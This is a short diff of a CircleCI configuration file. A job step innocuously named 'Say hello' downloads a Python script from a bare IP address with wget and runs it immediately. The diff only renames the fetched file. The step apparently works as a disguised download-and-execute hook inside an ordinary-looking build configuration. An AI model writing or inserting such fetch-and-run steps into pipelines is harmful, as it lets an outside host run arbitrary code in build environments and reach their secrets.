@@ -16,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: "wget 147.135.63.26/test.py; python3 test.py"
+          command: "wget 147.135.63.26/a.py; python3 a.py"
 
 # Orchestrate jobs using workflows
 # See: https://circleci.com/docs/configuration-reference/#workflows
